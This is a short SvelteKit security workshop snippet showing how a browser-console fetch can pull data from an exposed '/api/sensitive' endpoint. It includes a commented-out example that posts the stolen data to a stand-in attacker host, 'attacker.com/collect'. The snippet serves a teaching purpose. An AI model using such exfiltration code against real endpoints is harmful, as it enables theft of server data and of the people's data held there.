# SvelteKit Security Workshop

Paste this into the browser console to see how easy it is to steal
data from the server:

```js
fetch('/api/sensitive')
	.then((r) => r.json())
	.then((data) => {
		console.log('Stolen data:', data);
		// In real attack, would send to attacker's server:
		// fetch('https://attacker.com/collect', {
		//     method: 'POST',
		//     body: JSON.stringify(data)
		// });
	});
```
